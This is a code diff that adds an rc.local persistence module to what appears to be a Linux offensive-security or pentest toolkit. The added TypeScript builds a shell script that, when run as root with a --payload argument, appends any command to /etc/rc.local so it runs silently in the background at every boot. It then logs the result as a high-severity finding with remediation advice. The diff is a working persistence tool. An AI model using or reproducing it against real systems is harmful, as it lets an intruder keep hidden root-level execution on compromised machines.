@@ -1091,6 +1091,62 @@ fi
   }
 
   return { output: output.join("\n"), findings }
+}
+
+export async function rcLocalPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== rc.local Persistence ==="]
+  const payload = argVal(args, "--payload")
+
+  const script = `
+echo "--- rc.local Status ---"
+if [ -f /etc/rc.local ]; then
+  echo "[+] /etc/rc.local exists"
+  ls -la /etc/rc.local
+  echo ""
+  echo "--- Current Contents ---"
+  cat /etc/rc.local
+else
+  echo "[-] /etc/rc.local does not exist"
+  echo "  Can be created for boot-time execution"
+fi
+echo ""
+echo "--- rc-local.service ---"
+systemctl status rc-local.service 2>/dev/null | head -5 || echo "[-] rc-local.service not found"
+echo ""
+${payload ? `
+echo "--- Installing rc.local Persistence ---"
+if [ "$(id -u)" = "0" ]; then
+  if [ ! -f /etc/rc.local ]; then
+    printf '#!/bin/bash\\n' > /etc/rc.local
+  fi
+  sed -i '/^exit 0$/d' /etc/rc.local 2>/dev/null
+  echo "${payload} &>/dev/null &" >> /etc/rc.local
+  echo "exit 0" >> /etc/rc.local
+  chmod +x /etc/rc.local
+  echo "[+] Payload added to /etc/rc.local (executes on boot)"
+else
+  echo "[-] Root required"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Payload added to /etc/rc.local")) {
+    findings.push({
+      checkId: "LNX-RCLOCAL-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: "/etc/rc.local",
+      title: "rc.local persistence installed",
+      details: "Payload added to /etc/rc.local — executes as root on system boot",
+      remediation: "Audit /etc/rc.local for unauthorized entries. Consider disabling rc-local.service.",
+    })
+  }
 
   return { output: output.join("\n"), findings }
 }
